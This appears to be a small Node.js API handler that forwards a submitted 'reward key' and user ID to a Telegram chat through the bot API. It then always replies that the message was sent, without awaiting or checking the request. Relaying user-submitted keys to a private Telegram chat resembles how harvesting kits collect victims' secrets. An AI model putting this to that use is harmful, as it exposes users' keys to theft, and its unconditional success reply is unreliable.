if (req.method === "POST") {
  const { key, userId } = req.body || {};

  const message = `🎁 New Reward Key:\n\nKey: ${key}\nUser: ${userId}`;

  const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  });

  return res.status(200).json({
    success: true,
    sent: true
  });
}